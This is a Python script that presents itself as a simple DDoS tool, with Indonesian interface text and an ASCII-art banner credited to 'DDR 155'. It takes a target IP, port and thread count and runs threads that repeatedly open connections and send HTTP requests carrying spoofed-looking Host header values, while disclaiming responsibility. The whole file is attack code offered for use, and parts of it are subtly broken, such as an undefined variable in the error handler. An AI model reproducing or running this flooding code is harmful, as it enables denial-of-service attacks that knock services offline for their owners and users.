import socket
import threading
import argparse
import time
import random
import os
from termcolor import colored

logo = """
██████╗░██████╗░░█████╗░░██████╗  ░░███╗░░███████╗███████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ░████║░░██╔════╝██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░  ██╔██║░░██████╗░██████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗  ╚═╝██║░░╚════██╗╚════██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝  ███████╗██████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚══════╝╚═════╝░╚═════╝░
"""


fake_ips = ['44.197.175.168', '192.168.0.1', '10.0.0.1', '172.16.0.1', '8.8.8.8', '232.90.105.183', '213.28.174.127', '60.154.244.117', '8.208.252.93', '130.122.168.7', '104.226.204.68', '209.204.12.185', '178.208.147.108', '129.61.10.148', '31.49.78.49']


parser = argparse.ArgumentParser(description="TOOLS DDOS SEDERHANA")
parser.add_argument("-t", "--target", help="Target IP address", required=True)
parser.add_argument("-p", "--port", help="Target port", type=int, required=True)
parser.add_argument("-j", "--threads", help="Jumlah Serangan", type=int, required=True)
args = parser.parse_args()

os.system("clear")
target = args.target
port = args.port
Trd = args.threads
print(colored(f"{logo}","red"))
print(colored("By DDR 155","blue"))
print(colored("Admin Tidak Akan Bertanggung Jawab","blue"))
print(colored("Diluar Kendali Admin","blue"))
print(colored("Github: https://github.com/DDR-155","blue"))
print(colored(f"Target: {target} Port: {port} Jumlah: {Trd}","green"))
time.sleep(2)

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))

            fake_ip = random.choice(fake_ips)
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except socket.error:
            print(colored("WEBSITE TELAH BERHENTI OLEH DDR 155","red"))
            if fake_ip in current_fake_ips:
                current_fake_ips.remove(fake_ip)

attack_num = 0

for i in range(Trd):
    thread = threading.Thread(target=attack)
    thread.start()
    attack_num += 1
    print(colored(f"SERANGAN DI KIRIM OLEH DDR 155 = {attack_num}","green"))
    time.sleep(0.5)

